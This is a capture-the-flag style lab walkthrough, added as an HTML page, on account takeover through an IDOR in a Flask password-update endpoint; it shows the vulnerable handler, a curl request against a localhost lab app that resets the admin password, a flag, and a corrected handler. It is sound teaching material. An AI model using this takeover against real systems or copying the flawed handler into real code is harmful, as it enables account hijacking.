@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Lab 2 Walkthrough</title>
+  <style>
+    :root {
+      --bg: #0b0f14;
+      --panel: #11161d;
+      --text: #e5e7eb;
+      --muted: #a3acb9;
+      --line: #222a35;
+      --accent: #f59e0b;
+      --code-bg: #0f141b;
+      --code-text: #dbe4ee;
+      --kw: #c792ea;
+      --fn: #82aaff;
+      --str: #c3e88d;
+      --tag: #f78c6c;
+      --attr: #ffcb6b;
+      --var: #b0bec5;
+      --comment: #6b7280;
+    }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: Arial, Helvetica, sans-serif;
+      padding: 32px 16px 48px;
+    }
+    .page { max-width: 820px; margin: 0 auto; }
+    .article {
+      background: var(--panel);
+      border: 1px solid var(--line);
+      border-radius: 10px;
+      padding: 32px;
+    }
+    .eyebrow {
+      font-size: 0.78rem;
+      font-weight: 700;
+      letter-spacing: 0.08em;
+      text-transform: uppercase;
+      color: var(--accent);
+      margin-bottom: 14px;
+    }
+    h1 { font-size: 2.2rem; line-height: 1.1; margin-bottom: 16px; font-weight: 700; }
+    .lead { font-size: 1rem; line-height: 1.7; color: var(--muted); margin-bottom: 32px; }
+    section + section { margin-top: 36px; padding-top: 28px; border-top: 1px solid var(--line); }
+    h2 { font-size: 1.35rem; margin-bottom: 14px; }
+    h3 { font-size: 0.98rem; margin: 22px 0 10px; color: var(--text); }
+    p { font-size: 0.98rem; line-height: 1.7; color: var(--muted); margin-bottom: 14px; }
+    pre {
+      margin: 14px 0 18px;
+      padding: 16px 18px;
+      overflow-x: auto;
+      background: var(--code-bg);
+      color: var(--code-text);
+      border: 1px solid var(--line);
+      border-radius: 8px;
+      font: 0.94rem/1.65 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    }
+    code.inline {
+      font: 0.92em ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+      background: #1b2330;
+      color: var(--accent);
+      padding: 2px 6px;
+      border-radius: 6px;
+    }
+    .callout {
+      padding: 16px 18px;
+      border-left: 4px solid var(--accent);
+      background: #0f141b;
+      margin: 14px 0 18px;
+      color: var(--muted);
+    }
+    .kw { color: var(--kw); }
+    .fn { color: var(--fn); }
+    .str { color: var(--str); }
+    .tag { color: var(--tag); }
+    .attr { color: var(--attr); }
+    .var { color: var(--var); }
+    .comment { color: var(--comment); }
+    strong { color: var(--text); }
+    @media (max-width: 820px) {
+      body { padding: 20px 12px 40px; }
+      .article { padding: 24px 20px; }
+      h1 { font-size: 2rem; }
+    }
+  </style>
+</head>
+<body>
+  <main class="page">
+    <article class="article">
+      <div class="eyebrow">Day 1 / Lab 2</div>
+      <h1>Account Takeover Through a Password-Update IDOR</h1>
+      <p class="lead">The password-update endpoint reads two values from the request body — the target user id and the "old" password — and trusts both. The "old password" check is run against the session user, but the password is then written to the user id from the body. A regular user can change anyone's password.</p>
+
+      <section>
+        <h2>Quick Reminder — IDOR</h2>
+        <p><strong>Insecure Direct Object Reference (IDOR)</strong> happens when an endpoint operates on an object identifier supplied by the client without verifying that the caller is allowed to act on that object.</p>
+        <p>In this lab the impact is <strong>full account takeover</strong>: the regular user rewrites the admin's password and then logs in as admin to read a secret only admin can see.</p>
+      </section>
+
+      <section>
+        <h2>Where the vulnerability comes from</h2>
+        <p>The handler validates <code class="inline">old</code> against the <em>session</em> user but writes to the <code class="inline">uid</code> from the request body. The mismatch is the entire bug.</p>
+
+        <pre><span class="kw">@app</span>.route(<span class="str">"/update_password"</span>, methods=[<span class="str">"POST"</span>])
+<span class="kw">def</span> <span class="fn">update_password</span>():
+    <span class="var">data</span> = request.get_json(silent=<span class="kw">True</span>) <span class="kw">or</span> {}
+    <span class="var">uid</span> = <span class="fn">int</span>(data.get(<span class="str">"id"</span>, <span class="str">0</span>) <span class="kw">or</span> request.form.get(<span class="str">"id"</span>, <span class="str">0</span>))
+    <span class="var">old</span> = data.get(<span class="str">"old"</span>) <span class="kw">or</span> request.form.get(<span class="str">"old"</span>)
+    <span class="var">new</span> = data.get(<span class="str">"new"</span>) <span class="kw">or</span> request.form.get(<span class="str">"new"</span>)
+    <span class="var">cu</span> = current_user()
+    <span class="kw">if</span> cu <span class="kw">and</span> cu[<span class="str">"password"</span>] == old <span class="kw">and</span> uid <span class="kw">in</span> users:
+        users[uid][<span class="str">"password"</span>] = new
+        <span class="kw">return</span> ...</pre>
+
+        <div class="callout">
+          <p>The HTML form ships a hidden <code class="inline">id</code> field equal to the session user. Hidden form fields are user-controlled — anything the browser submits, an attacker can edit.</p>
+        </div>
+      </section>
+
+      <section>
+        <h2>Exploitation</h2>
+        <p>Log in as the regular user, then submit the password-update form with <code class="inline">id=1</code> (the admin) and your <em>own</em> current password as <code class="inline">old</code>.</p>
+
+        <h3>Login as the regular user</h3>
+        <pre>username=user
+password=user123</pre>
+
+        <h3>Take over admin</h3>
+        <pre><span class="fn">curl</span> -i http://localhost:5010/update_password \
+  -b cookies.txt \
+  --data <span class="str">"id=1&old=user123&new=pwn3d"</span></pre>
+
+        <p>Log out, log back in as <code class="inline">admin</code> with the new password, then visit <code class="inline">/admin/secrets</code>.</p>
+
+        <h3>Flag</h3>
+        <pre>ID0R_PWN3D_TH3_4DM1N</pre>
+      </section>
+
+      <section>
+        <h2>The Fix</h2>
+        <p>Never accept the user identifier from the request body when the action targets the caller's own resource. Derive it from the session.</p>
+
+        <pre><span class="kw">@app</span>.route(<span class="str">"/update_password"</span>, methods=[<span class="str">"POST"</span>])
+<span class="kw">def</span> <span class="fn">update_password</span>():
+    <span class="var">cu</span> = current_user()
+    <span class="kw">if not</span> cu:
+        <span class="kw">return</span> redirect(url_for(<span class="str">"index"</span>))
+    <span class="var">old</span> = request.form.get(<span class="str">"old"</span>)
+    <span class="var">new</span> = request.form.get(<span class="str">"new"</span>)
+    <span class="kw">if</span> cu[<span class="str">"password"</span>] != old:
+        <span class="kw">return</span> <span class="str">"forbidden"</span>, <span class="str">403</span>
+    users[cu[<span class="str">"id"</span>]][<span class="str">"password"</span>] = new
+    <span class="comment"># password gets stored hashed in real apps</span>
+    <span class="kw">return</span> redirect(url_for(<span class="str">"profile"</span>))</pre>
+
+        <p>Two reinforcing rules to remember:</p>
+        <ul style="color: var(--muted); padding-left: 22px; line-height: 1.7;">
+          <li>The session is the source of truth for "who is acting" — never the request body.</li>
+          <li>If an endpoint must accept a target id (e.g. an admin acting on someone else), authorize that the caller is allowed to act on that target.</li>
+        </ul>
+      </section>
+    </article>
+  </main>
+</body>
+</html>
